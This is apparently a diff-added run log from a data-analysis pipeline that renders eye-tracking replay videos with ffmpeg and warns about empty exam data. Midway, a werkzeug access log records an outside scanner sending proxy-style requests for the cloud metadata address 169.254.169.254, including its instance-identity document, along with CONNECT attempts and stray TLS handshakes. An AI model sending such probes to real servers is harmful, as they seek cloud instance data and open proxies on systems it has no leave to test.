+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/576a6e4b-c466-4c6f-840a-6717aac98ed5/figures/1829_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/576a6e4b-c466-4c6f-840a-6717aac98ed5/figures/1829_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/576a6e4b-c466-4c6f-840a-6717aac98ed5/figures/1830_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '48.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/576a6e4b-c466-4c6f-840a-6717aac98ed5/figures/1830_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '49.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/576a6e4b-c466-4c6f-840a-6717aac98ed5/figures/1832_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '49.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/576a6e4b-c466-4c6f-840a-6717aac98ed5/figures/1832_replay.mp4']
+INFO:root:Processing: b266986b-c4ee-4414-ab37-ebd4a6c184a1
+Processing: b266986b-c4ee-4414-ab37-ebd4a6c184a1
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/b266986b-c4ee-4414-ab37-ebd4a6c184a1/figures/2606_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/b266986b-c4ee-4414-ab37-ebd4a6c184a1/figures/2606_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/b266986b-c4ee-4414-ab37-ebd4a6c184a1/figures/2607_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/b266986b-c4ee-4414-ab37-ebd4a6c184a1/figures/2607_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/b266986b-c4ee-4414-ab37-ebd4a6c184a1/figures/2608_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/b266986b-c4ee-4414-ab37-ebd4a6c184a1/figures/2608_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/b266986b-c4ee-4414-ab37-ebd4a6c184a1/figures/2609_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/b266986b-c4ee-4414-ab37-ebd4a6c184a1/figures/2609_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/b266986b-c4ee-4414-ab37-ebd4a6c184a1/figures/2610_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/b266986b-c4ee-4414-ab37-ebd4a6c184a1/figures/2610_replay.mp4']
+INFO:root:Processing: 6ea1ce02-298a-4c42-82d0-5123d3fca607
+Processing: 6ea1ce02-298a-4c42-82d0-5123d3fca607
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '53.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6ea1ce02-298a-4c42-82d0-5123d3fca607/figures/2262_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '53.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6ea1ce02-298a-4c42-82d0-5123d3fca607/figures/2262_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '53.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6ea1ce02-298a-4c42-82d0-5123d3fca607/figures/2263_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '53.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6ea1ce02-298a-4c42-82d0-5123d3fca607/figures/2263_replay.mp4']
+/home/ubuntu/reactrack/analysis.py:380: RuntimeWarning: Mean of empty slice
+  pupil = pupil - np.nanmean(pupil[stim_idx - 5: stim_idx])
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6ea1ce02-298a-4c42-82d0-5123d3fca607/figures/2264_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6ea1ce02-298a-4c42-82d0-5123d3fca607/figures/2264_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6ea1ce02-298a-4c42-82d0-5123d3fca607/figures/2265_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6ea1ce02-298a-4c42-82d0-5123d3fca607/figures/2265_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6ea1ce02-298a-4c42-82d0-5123d3fca607/figures/2266_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '54.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/6ea1ce02-298a-4c42-82d0-5123d3fca607/figures/2266_replay.mp4']
+INFO:root:Processing: 94ea8153-3504-42d8-88f7-e7af23239155
+Processing: 94ea8153-3504-42d8-88f7-e7af23239155
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/94ea8153-3504-42d8-88f7-e7af23239155/figures/2069_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/94ea8153-3504-42d8-88f7-e7af23239155/figures/2069_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/94ea8153-3504-42d8-88f7-e7af23239155/figures/2070_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/94ea8153-3504-42d8-88f7-e7af23239155/figures/2070_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/94ea8153-3504-42d8-88f7-e7af23239155/figures/2071_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/94ea8153-3504-42d8-88f7-e7af23239155/figures/2071_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/94ea8153-3504-42d8-88f7-e7af23239155/figures/2072_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/94ea8153-3504-42d8-88f7-e7af23239155/figures/2072_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/94ea8153-3504-42d8-88f7-e7af23239155/figures/2073_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '50.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/94ea8153-3504-42d8-88f7-e7af23239155/figures/2073_replay.mp4']
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:29] "GET http://example.com/ HTTP/1.1" 404 -
+44.224.22.196 - - [03/Feb/2020 01:02:29] "GET http://example.com/ HTTP/1.1" 404 -
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:29] "GET http://169.254.169.254/ HTTP/1.1" 404 -
+44.224.22.196 - - [03/Feb/2020 01:02:29] "GET http://169.254.169.254/ HTTP/1.1" 404 -
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:29] "GET http://[::ffff:a9fe:a9fe]/ HTTP/1.1" 404 -
+44.224.22.196 - - [03/Feb/2020 01:02:29] "GET http://[::ffff:a9fe:a9fe]/ HTTP/1.1" 404 -
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:29] "GET http://169.254.169.254/latest/dynamic/instance-identity/document HTTP/1.1" 404 -
+44.224.22.196 - - [03/Feb/2020 01:02:29] "GET http://169.254.169.254/latest/dynamic/instance-identity/document HTTP/1.1" 404 -
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:29] "GET http://[::ffff:a9fe:a9fe]/latest/dynamic/instance-identity/document HTTP/1.1" 404 -
+44.224.22.196 - - [03/Feb/2020 01:02:29] "GET http://[::ffff:a9fe:a9fe]/latest/dynamic/instance-identity/document HTTP/1.1" 404 -
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:29] "GET / HTTP/1.1" 404 -
+44.224.22.196 - - [03/Feb/2020 01:02:29] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:30] "GET / HTTP/1.1" 404 -
+44.224.22.196 - - [03/Feb/2020 01:02:30] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:30] "GET / HTTP/1.1" 404 -
+44.224.22.196 - - [03/Feb/2020 01:02:30] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:30] "GET /latest/dynamic/instance-identity/document HTTP/1.1" 404 -
+44.224.22.196 - - [03/Feb/2020 01:02:30] "GET /latest/dynamic/instance-identity/document HTTP/1.1" 404 -
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:30] "GET /latest/dynamic/instance-identity/document HTTP/1.1" 404 -
+44.224.22.196 - - [03/Feb/2020 01:02:30] "GET /latest/dynamic/instance-identity/document HTTP/1.1" 404 -
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:30] "CONNECT 18.221.168.101:80 HTTP/1.0" 404 -
+44.224.22.196 - - [03/Feb/2020 01:02:30] "CONNECT 18.221.168.101:80 HTTP/1.0" 404 -
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:31] "CONNECT 18.221.168.101:80 HTTP/1.0" 404 -
+44.224.22.196 - - [03/Feb/2020 01:02:31] "CONNECT 18.221.168.101:80 HTTP/1.0" 404 -
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:31] "CONNECT 18.221.168.101:80 HTTP/1.0" 404 -
+44.224.22.196 - - [03/Feb/2020 01:02:31] "CONNECT 18.221.168.101:80 HTTP/1.0" 404 -
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:31] "CONNECT 18.221.168.101:80 HTTP/1.0" 404 -
+44.224.22.196 - - [03/Feb/2020 01:02:31] "CONNECT 18.221.168.101:80 HTTP/1.0" 404 -
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:31] "CONNECT 18.221.168.101:80 HTTP/1.0" 404 -
+44.224.22.196 - - [03/Feb/2020 01:02:31] "CONNECT 18.221.168.101:80 HTTP/1.0" 404 -
+ERROR:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:31] code 400, message Bad request version ('À(À$À\x14À')
+44.224.22.196 - - [03/Feb/2020 01:02:31] code 400, message Bad request version ('À(À$À\x14À')
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:31] " Ò  ÎT+¸Ö¥Q3YAz }:bÿÌ*ÕJ¥D9+&  bÀ0À,À/À+  À2À.À1À- ¥ ¡ ¤  À(À$ÀÀ" HTTPStatus.BAD_REQUEST -
+44.224.22.196 - - [03/Feb/2020 01:02:31] " Ò  ÎT+¸Ö¥Q3YAz }:bÿÌ*ÕJ¥D9+&  bÀ0À,À/À+  À2À.À1À- ¥ ¡ ¤  À(À$ÀÀ" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:31] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ò\x01\x00\x00Î\x03\x03´\x91\x17\x84\x8d\x08\x9cá&\x80')
+44.224.22.196 - - [03/Feb/2020 01:02:31] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ò\x01\x00\x00Î\x03\x03´\x91\x17\x84\x8d\x08\x9cá&\x80')
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:31] " Ò  Î´á& 4Bj}ÞÑPà" HTTPStatus.BAD_REQUEST -
+44.224.22.196 - - [03/Feb/2020 01:02:31] " Ò  Î´á& 4Bj}ÞÑPà" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:32] code 400, message Bad request syntax ('\x16\x03\x01\x00Ò\x01\x00\x00Î\x03\x03xP¢³Û,º\rF6ÌÿypÅ\x8eíI\x85ø2\r$ÿÿsÚ\x8cÒ\x88\t\x8c\x00\x00bÀ0À,À/À+\x00\x9f\x00\x9eÀ2À.À1À-\x00¥\x00¡\x00¤\x00\xa0À(À$À\x14À')
+44.224.22.196 - - [03/Feb/2020 01:02:32] code 400, message Bad request syntax ('\x16\x03\x01\x00Ò\x01\x00\x00Î\x03\x03xP¢³Û,º\rF6ÌÿypÅ\x8eíI\x85ø2\r$ÿÿsÚ\x8cÒ\x88\t\x8c\x00\x00bÀ0À,À/À+\x00\x9f\x00\x9eÀ2À.À1À-\x00¥\x00¡\x00¤\x00\xa0À(À$À\x14À')
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:32] " Ò  ÎxP¢³Û,ºF6ÌÿypÅíIø2$ÿÿsÚÒ	  bÀ0À,À/À+  À2À.À1À- ¥ ¡ ¤  À(À$ÀÀ" HTTPStatus.BAD_REQUEST -
+44.224.22.196 - - [03/Feb/2020 01:02:32] " Ò  ÎxP¢³Û,ºF6ÌÿypÅíIø2$ÿÿsÚÒ	  bÀ0À,À/À+  À2À.À1À- ¥ ¡ ¤  À(À$ÀÀ" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:32] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ò\x01\x00\x00Î\x03\x03¡\x8f\x14iÖJ\x05BiN[\x1a2µ.´FLLw4´\x12Î¾Æ\\[é\x99¡7\x00\x00bÀ0À,À/À+\x00\x9f\x00\x9eÀ2À.À1À-\x00¥\x00¡\x00¤\x00')
+44.224.22.196 - - [03/Feb/2020 01:02:32] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00Ò\x01\x00\x00Î\x03\x03¡\x8f\x14iÖJ\x05BiN[\x1a2µ.´FLLw4´\x12Î¾Æ\\[é\x99¡7\x00\x00bÀ0À,À/À+\x00\x9f\x00\x9eÀ2À.À1À-\x00¥\x00¡\x00¤\x00')
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:32] " Ò  Î¡iÖJBiN[2µ.´FLLw4´Î¾Æ\[é¡7  bÀ0À,À/À+  À2À.À1À- ¥ ¡ ¤  À(À$ÀÀ" HTTPStatus.BAD_REQUEST -
+44.224.22.196 - - [03/Feb/2020 01:02:32] " Ò  Î¡iÖJBiN[2µ.´FLLw4´Î¾Æ\[é¡7  bÀ0À,À/À+  À2À.À1À- ¥ ¡ ¤  À(À$ÀÀ" HTTPStatus.BAD_REQUEST -
+ERROR:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:32] code 400, message Bad request version ('À(À$À\x14À')
+44.224.22.196 - - [03/Feb/2020 01:02:32] code 400, message Bad request version ('À(À$À\x14À')
+INFO:werkzeug:44.224.22.196 - - [03/Feb/2020 01:02:32] " Ò  Î]7e"QÔ0º	x_njK©:è(3;} !c-A  bÀ0À,À/À+  À2À.À1À- ¥ ¡ ¤  À(À$ÀÀ" HTTPStatus.BAD_REQUEST -
+44.224.22.196 - - [03/Feb/2020 01:02:32] " Ò  Î]7e"QÔ0º	x_njK©:è(3;} !c-A  bÀ0À,À/À+  À2À.À1À- ¥ ¡ ¤  À(À$ÀÀ" HTTPStatus.BAD_REQUEST -
+INFO:root:Processing: 4e6dcaeb-5d22-4912-854c-f58fb377e4af
+Processing: 4e6dcaeb-5d22-4912-854c-f58fb377e4af
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4e6dcaeb-5d22-4912-854c-f58fb377e4af/figures/2564_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4e6dcaeb-5d22-4912-854c-f58fb377e4af/figures/2564_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4e6dcaeb-5d22-4912-854c-f58fb377e4af/figures/2565_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4e6dcaeb-5d22-4912-854c-f58fb377e4af/figures/2565_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4e6dcaeb-5d22-4912-854c-f58fb377e4af/figures/2566_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4e6dcaeb-5d22-4912-854c-f58fb377e4af/figures/2566_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4e6dcaeb-5d22-4912-854c-f58fb377e4af/figures/2567_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4e6dcaeb-5d22-4912-854c-f58fb377e4af/figures/2567_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4e6dcaeb-5d22-4912-854c-f58fb377e4af/figures/2568_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '90.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4e6dcaeb-5d22-4912-854c-f58fb377e4af/figures/2568_replay.mp4']
+INFO:root:Processing: 5926bfba-2dab-4068-bf1f-248381f2a61b
+Processing: 5926bfba-2dab-4068-bf1f-248381f2a61b
+INFO:root:Processing: d9db4bca-a03b-402a-bda1-9994820c5e22
+Processing: d9db4bca-a03b-402a-bda1-9994820c5e22
+WARNING:root:Empty data for visit_exam_id: 2178
+Empty data for visit_exam_id: 2178
+WARNING:root:Empty data for visit_exam_id: 2179
+Empty data for visit_exam_id: 2179
+WARNING:root:Empty data for visit_exam_id: 2180
+Empty data for visit_exam_id: 2180
+WARNING:root:Empty data for visit_exam_id: 2181
+Empty data for visit_exam_id: 2181
+WARNING:root:Empty data for visit_exam_id: 2182
+Empty data for visit_exam_id: 2182
+WARNING:root:Sampling rate problem.
+Sampling rate problem.
+WARNING:root:visit_exam_id: 2183
+visit_exam_id: 2183
+WARNING:root:No data to report for visit_id: d9db4bca-a03b-402a-bda1-9994820c5e22
+No data to report for visit_id: d9db4bca-a03b-402a-bda1-9994820c5e22
+INFO:root:Processing: 46e25d18-279c-41e5-97b6-540510bffa5a
+Processing: 46e25d18-279c-41e5-97b6-540510bffa5a
+WARNING:root:Empty data for visit_exam_id: 1992
+Empty data for visit_exam_id: 1992
+WARNING:root:Empty data for visit_exam_id: 1993
+Empty data for visit_exam_id: 1993
+WARNING:root:Empty data for visit_exam_id: 1994
+Empty data for visit_exam_id: 1994
+WARNING:root:Empty data for visit_exam_id: 1995
+Empty data for visit_exam_id: 1995
+WARNING:root:Empty data for visit_exam_id: 1996
+Empty data for visit_exam_id: 1996
+INFO:root:Processing: 4aff2337-d948-496f-bb7c-f544ce08bb64
+Processing: 4aff2337-d948-496f-bb7c-f544ce08bb64
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4aff2337-d948-496f-bb7c-f544ce08bb64/figures/2455_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4aff2337-d948-496f-bb7c-f544ce08bb64/figures/2455_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4aff2337-d948-496f-bb7c-f544ce08bb64/figures/2456_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4aff2337-d948-496f-bb7c-f544ce08bb64/figures/2456_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4aff2337-d948-496f-bb7c-f544ce08bb64/figures/2457_replay.mp4']
+MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4aff2337-d948-496f-bb7c-f544ce08bb64/figures/2457_replay.mp4']
+INFO:matplotlib.animation:MovieWriter.run: running command: ['ffmpeg', '-f', 'rawvideo', '-vcodec', 'rawvideo', '-s', '3000x2000', '-pix_fmt', 'rgba', '-r', '51.0', '-loglevel', 'error', '-i', 'pipe:', '-vcodec', 'mpeg4', '-y', './reports/4aff2337-d948-496f-bb7c-f544ce08bb64/figures/2458_replay.mp4']
